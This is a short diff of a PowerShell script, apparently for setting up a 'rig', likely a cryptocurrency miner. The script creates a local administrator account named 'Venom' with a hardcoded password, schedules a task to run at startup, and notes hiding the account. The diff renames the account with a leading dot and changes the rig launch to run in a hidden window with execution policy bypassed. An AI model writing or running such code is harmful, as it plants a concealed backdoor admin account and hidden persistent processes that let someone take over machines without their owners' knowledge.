@@ -14,8 +14,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 } else {
     # Create a new local admin account
-    $username = "Venom"
-    $password = ConvertTo-SecureString "V3n0m" -AsPlainText -Force
+    $username = ".Venom"
+    $password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
     New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
     Add-LocalGroupMember -Group "Administrators" -Member $username
 }
@@ -113,7 +113,7 @@ Write-Host "Scheduled task created successfully. Your CMD file will now run at s
 
 
 # start rig
-./start.cmd
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
 
 pause
 # hide venom user
